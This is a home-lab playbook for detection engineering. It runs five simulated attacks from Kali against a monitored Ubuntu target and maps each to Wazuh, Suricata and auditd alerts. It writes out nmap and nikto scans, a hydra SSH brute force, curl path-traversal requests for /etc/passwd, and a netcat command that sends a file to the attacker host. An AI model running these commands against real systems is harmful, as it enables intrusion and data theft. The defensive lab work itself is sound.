# Attack Simulation Playbook

This document details the five attack simulations executed against the target machine (192.168.56.11) from the Kali Linux attacker (192.168.56.12), along with the expected detections in Wazuh.

---

## Environment

| Machine | IP | Role |
|---------|-----|------|
| Wazuh Server | 192.168.56.10 | SIEM (Manager + Indexer + Dashboard) |
| Target | 192.168.56.11 | Monitored victim (Wazuh Agent + Suricata + auditd) |
| Kali Linux | 192.168.56.12 | Attacker |

---

## Attack 1: Network Reconnaissance (Port Scanning)

**MITRE ATT&CK:** T1046 — Network Service Scanning

**Objective:** Discover open ports and running services on the target to plan further attacks.

**Commands (from Kali):**
```bash
# SYN scan with service version detection
sudo nmap -sS -sV 192.168.56.11

# Aggressive scan with OS detection
sudo nmap -A -T4 192.168.56.11

# Full port scan
sudo nmap -p- 192.168.56.11
```

**Results:**
- Discovered open ports: 22 (SSH — OpenSSH 8.9), 80 (HTTP — Apache 2.4.52)
- Identified operating system: Ubuntu Linux

**Detection:**
- Suricata triggered alerts for TCP SYN scan patterns
- Wazuh custom rule 100001 (Level 8) — Port scan detected
- Wazuh custom rule 100010 (Level 10) — Aggressive scanning (15+ alerts in 2 minutes)

---

## Attack 2: SSH Brute Force

**MITRE ATT&CK:** T1110.001 — Brute Force: Password Guessing

**Objective:** Crack SSH credentials using a password wordlist to gain initial access.

**Setup:**
```bash
# Create password wordlist on Kali
cat > /tmp/passwords.txt << 'EOF'
admin
password
123456
letmein
root
toor
qwerty
abc123
monkey
dragon
master
password123
EOF
```

**Attack Command:**
```bash
hydra -l testuser -P /tmp/passwords.txt ssh://192.168.56.11 -t 4 -V -f
```

**Results:**
- Hydra tested 12 passwords against the testuser account
- Successfully cracked the password: `password123`
- 11 failed login attempts followed by 1 successful login

**Detection:**
- Wazuh built-in rule 5760 — SSH authentication failed (per attempt)
- Wazuh custom rule 100002 (Level 10) — SSH brute force detected (5+ failures in 60 seconds)
- Wazuh custom rule 100011 (Level 12) — High confidence brute force (10+ failures in 2 minutes)

**Automated Response:**
- Active Response: `firewall-drop` blocked attacker IP (192.168.56.12) via iptables for 1 hour

---

## Attack 3: Web Application Scanning

**MITRE ATT&CK:** T1190 — Exploit Public-Facing Application, T1595.002 — Active Scanning: Vulnerability Scanning

**Objective:** Identify web vulnerabilities, hidden directories, and attempt directory traversal on the Apache web server.

**Commands (from Kali):**
```bash
# Web vulnerability scan
nikto -h http://192.168.56.11

# Directory brute force
dirb http://192.168.56.11 /usr/share/dirb/wordlists/common.txt

# Manual directory traversal
curl http://192.168.56.11/../../../../etc/passwd
curl "http://192.168.56.11/cgi-bin/../../../../etc/passwd"
```

**Results:**
- Nikto identified Apache version, missing security headers, and default files
- dirb discovered `/index.html` and `/server-status` (403 Forbidden)
- Directory traversal attempts returned 400 Bad Request (blocked by Apache)

**Detection:**
- Wazuh built-in rule 31101 — Web server 400 error code (per request)
- Wazuh built-in rule 31151 — Multiple web server 400 errors from same source
- Wazuh custom rule 100004 (Level 12) — Directory traversal attempt detected
- Wazuh custom rule 100005 (Level 10) — Web vulnerability scanning detected (30+ requests in 60 seconds)

---

## Attack 4: Privilege Escalation

**MITRE ATT&CK:** T1548.003 — Abuse Elevation Control: Sudo, T1083 — File and Directory Discovery

**Objective:** After gaining initial access via SSH, attempt to escalate privileges to root.

**Commands (from Kali, SSH'd into target as testuser):**
```bash
# SSH into target with cracked credentials
ssh testuser@192.168.56.11

# Attempt to become root
sudo su
sudo cat /etc/shadow
sudo -l

# Enumerate SUID binaries
find / -perm -u=s -type f 2>/dev/null

# System reconnaissance
cat /etc/crontab
uname -a
cat /etc/os-release
```

**Results:**
- All sudo attempts failed — testuser is not in the sudoers file
- SUID enumeration revealed standard system binaries (sudo, passwd, mount, su)
- No exploitable privilege escalation path found

**Detection:**
- Wazuh built-in rule 5405 — Unauthorized user attempted to use sudo
- Wazuh custom rule 100006 (Level 12) — Unauthorized sudo attempt (MITRE T1548.003)
- Wazuh custom rule 100007 (Level 8) — SUID binary enumeration detected (MITRE T1083)
- auditd captured all `find` and `sudo` execution events

---

## Attack 5: Data Exfiltration

**MITRE ATT&CK:** T1041 — Exfiltration Over C2 Channel

**Objective:** Exfiltrate sensitive data from the compromised target to the attacker machine.

**Setup (Kali — listener):**
```bash
# Open a listener to receive exfiltrated data
nc -lvp 9999
```

**Attack Commands (from SSH session on target as testuser):**
```bash
# Create fake sensitive data
echo "CONFIDENTIAL: Employee Records" > /tmp/sensitive_data.txt
echo "John Doe, SSN: 123-45-6789" >> /tmp/sensitive_data.txt
echo "Jane Smith, CC: 4111-1111-1111-1111" >> /tmp/sensitive_data.txt

# Exfiltrate via netcat
cat /tmp/sensitive_data.txt | nc 192.168.56.12 9999
```

**Results:**
- Data successfully transferred from target to attacker machine
- Kali listener received the complete file contents

**Detection:**
- auditd captured netcat execution with key `suspicious_tool`
- Wazuh custom rule 100008 (Level 13) — Netcat execution detected (MITRE T1041)
- Wazuh custom rule 100009 (Level 10) — Suspicious outbound network connection

---

## Kill Chain Summary

```
Reconnaissance     →  Initial Access      →  Privilege Escalation  →  Exfiltration
(Nmap port scan)      (Hydra brute force)    (sudo attempts)          (Netcat transfer)
     │                      │                       │                       │
     ▼                      ▼                       ▼                       ▼
  T1046                 T1110.001               T1548.003                T1041
  Detected by           Detected by             Detected by              Detected by
  Suricata +            Wazuh rules             Wazuh rules              auditd +
  Custom Rule           5760, 100002            5405, 100006             Custom Rule
  100001                Auto-blocked IP         Logged                   100008
```

---

## Lessons Learned

1. **Defense in Depth:** Combining network-level (Suricata) and endpoint-level (auditd) monitoring provides comprehensive visibility that neither achieves alone.
2. **Rule Tuning:** Built-in SIEM rules are a starting point — custom rules with proper severity levels and frequency thresholds significantly reduce false positives and improve signal-to-noise ratio.
3. **Automated Response:** Active response capabilities like IP blocking and user lockout drastically reduce attacker dwell time, but must be carefully configured to avoid blocking legitimate traffic.
4. **MITRE ATT&CK Mapping:** Standardized technique mapping enables consistent communication about threats and helps identify detection gaps across the kill chain.